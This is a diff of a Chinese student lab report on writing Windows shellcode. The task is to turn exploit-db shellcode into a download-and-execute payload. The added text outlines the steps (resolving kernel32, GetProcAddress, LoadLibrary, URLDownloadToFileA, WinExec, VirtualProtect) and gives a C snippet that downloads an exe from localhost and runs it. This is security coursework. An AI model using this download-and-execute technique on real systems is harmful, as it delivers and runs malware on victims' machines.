@@ -2,7 +2,7 @@
 
 ## 实验要求
 - [x] 1、详细阅读 www.exploit-db.com 中的shellcode。建议找不同功能的，不同平台的 3-4个shellcode解读。
-- [] 2、修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
+- [x] 2、修改示例代码的shellcode，将其功能改为下载执行。也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows系统中最简单的下载一个文件的API是 UrlDownlaodToFileA
 * 其中第二个作业，原参考代码只调用了一个API函数，作业要求调用更多的API函数了，其中涉及到的参数也更复杂，但是原理是相通的。
 * URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以可能还需要调用LoadLibrary函数
 ## 实验步骤
@@ -122,23 +122,65 @@ link /subsystem:windows /section:.text,w wexec2.obj
 修改[示例shellcode](https://www.exploit-db.com/shellcodes/48116),使其下载并运行某个程序  
 [shellcode来源](https://www.exploit-db.com/shellcodes/24318)
 #### 实验原理
-shellcode要实现的步骤：
-1. 获取kernel32.dll基地址
-2. 定位GetProcAddress函数地址
-3. 使用GetProcAddress确定LoadLibrary函数地址
-4. 使用LoadLibrary加载DLL文件
-5. 使用GetProcAddress查找某个函数的地址（例如MessageBox）
-6. 指定函数参数
-7. 调用函数
-#### 实验步骤
-1. 
-#### 实验效果
+1. 提前编译链接好一个.exe，搭建web服务器提供.exe的下载。
+2. 编写shellcode
+* shellcode要实现的步骤：  
+1)获取kernel32.dll基地址  
+2)定位GetProcAddress函数地址  
+3)使用GetProcAddress确定LoadLibrary函数地址  
+4)使用LoadLibrary加载DLL文件  
+5)使用GetProcAddress查找某个函数的地址   
+6)指定函数参数  
+7)调用函数  
+3. shellcode转成十六进制字符串
+4. 使用C语言，函数指针的方式，执行shellcode转化成的十六进制字符串
 
+#### 实验步骤
+1. 使用cmd.exe进入shellcode.exe文件夹，输入```python -m http.server 5000```开启静态服务器提供exe下载。
+* 可以执行以下代码并试用体会URLDownloadToFile()和WinExec()功能。测试结果如图：  
+![](images/test1.png)  
+>code/memeory.c的代码内容如下，用于测试exe是否能被正确下载和执行：
+```
+#include <stdio.h>
+#include <Urlmon.h>
+#include <shellapi.h>
+#pragma comment (lib,"Urlmon.lib")
+int main(void)
+{
+ HRESULT hr = URLDownloadToFile(NULL, "http://127.0.0.1:5000/memory.exe", "shellcode.exe", 0, NULL);
+ if (hr == S_OK)
+ {
+  printf("OK\n");
+ }
+ WinExec("shellcode.exe", 0);
+ ExitProcess(0);
+ return 0;
+
+}
+```
+>code/shellcode.exe是编译链接好的可执行文件，调用MessageBox(),功能是显示一个标题为'shellcode-test',内容为'shellcode writed by mudou'的弹窗  
+2. 编写shellcode,生成汇编语言文件与二进制文件
+>code/shell.asm是汇编语言文件  
+>code/Shellcode.bin是二进制文件
+3. shellcode转成十六进制
+![](images/gethex.png)
+* 以上结果再在.c文件中改改就好~
+4. vs中使用.c文件运行shellcode
+![](images/shellcode-test.png)  
+>code/shellcode.c是应用shellcode的代码
+#### 实验效果
+![](images/result.png)
 ## 实验问题
 1. linux 32位的系统搞了好久，怪不得老师说要认真学习使用vim与vi,现在64位最新使用的系统已经十分人性化，而以前的系统真是十分严格的linux呢！而且host-only的dhcp也是要自己搞，还好之前ns课程有踩坑。
 2. 对于汇编语言和C语言的编译链接方式不一样，windows 32位系统shellcode的应用也搞了好久，因为使用之前的```cl /c /MT a.c```和```link /SUBSYSTEM:CONSOLE,5.01 a.obj```依然无法在xp-sp3中使用，只能采用汇编语言编译链接的方式。  
 关于编译链接的总结：在自己有限次数的实验中，发现如果有汇编语言，那么编译链接汇编语言的方式更为靠谱，此外，同一个示例代码不能因为一次应用不成功就否认，应该变换工具编译链接，然后再扔到各个环境中尝试。
-3. 
+3. 测试使用URLDownloadToFile()下载文件的时候，一开始偷懒没有自己搭服务器，而是上传到了github上再下载，会出现文件损坏。  
+![](images/wrong1.png)  
+分析：一开始以为是函数使用错误，结果不是，观察很久发现是文件损坏。原因是github服务器在国外，速度慢，下载过程中会疏漏。  
+解决：自己搭静态服务器。
+4. 应用shellcode时，.c测试文件内存报错，报错如下图：  
+![](images/wrong2.png)  
+解决：使用virtualprotect()
 ## 实验总结
 1. 经过此次实验作业，加深了对汇编语言的理解和感受，学好汇编太重要了。首先是AT&T与Intel风格的汇编语言区别:  
 DOS/Windows 下的汇编语言代码都是 Intel 风格的，而 Linux 和 Unix 系统中更多采用的是 AT&T 格式。  
@@ -193,4 +235,6 @@ ldr的定义：
 [Shellcode](https://en.wikipedia.org/wiki/Shellcode)  
 [Windows平台shellcode开发入门（一）](https://www.freebuf.com/articles/system/93983.html)  
 [Windows平台shellcode开发入门（二）](https://www.freebuf.com/articles/system/94774.html)  
-[Windows平台shellcode开发入门（三）](https://www.freebuf.com/articles/system/97215.html)
+[Windows平台shellcode开发入门（三）](https://www.freebuf.com/articles/system/97215.html)  
+[shellcode教程从新手到高手](https://wooyun.js.org/drops/shellcode%E6%95%99%E7%A8%8B%E4%BB%8E%E6%96%B0%E6%89%8B%E5%88%B0%E9%AB%98%E6%89%8B.html)  
+[ShellcodeCompiler](https://github.com/NytroRST/ShellcodeCompiler)
